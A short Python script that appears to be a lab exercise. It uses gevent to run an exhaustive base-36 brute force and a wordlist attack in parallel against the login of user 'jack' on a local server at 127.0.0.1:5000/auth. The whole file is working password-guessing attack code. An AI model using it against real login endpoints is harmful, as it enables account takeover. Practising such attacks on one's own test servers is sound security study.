import gevent
from gevent import monkey
import time

monkey.patch_all()

import requests

def straight_brute():
    alphabet = '0123456789abcdefghijklmnopqrstuvwxyz'

    base = len(alphabet)

    counter = 0
    length = 0

    while True:
        # counter -> str at base -> password
        # 1000 == 62 * 16 + 8 == (3 * 16 + 14) * 16 + 8 -> 3(14)8 == 3E8
        password = ''
        number = counter
        while number > 0:
            # counter = x * base + rest
            x = number // base
            rest = number % base
            password = alphabet[rest] + password
            number = x
        while len(password) < length:
            password = alphabet[0] + password
        # check password
        # print(length, counter, password)
        response = requests.post('http://127.0.0.1:5000/auth',
                                 json={'login': 'jack', 'password': password})
        if response.status_code == 200:
            print('SUCCESS by BRUTE', password)
            for job in jobs:
                job.kill()
            break
        if alphabet[-1] * length == password:
            length += 1
            counter = 0
        else:
            counter += 1

def list_brute():
    import requests

    with open('../popular.txt') as f:
        passwords = f.read().split('\n')

    for password in passwords:
        response = requests.post('http://127.0.0.1:5000/auth',
                                 json={'login': 'jack', 'password': password})
        if response.status_code == 200:
            print('SUCCESS by LIST', password)
            for job in jobs:
                job.kill()
            break

jobs = [
    gevent.spawn(straight_brute),
    gevent.spawn(list_brute)
]

started = time.time()
gevent.joinall(jobs)

print('Spent: {}'.format(time.time() - started))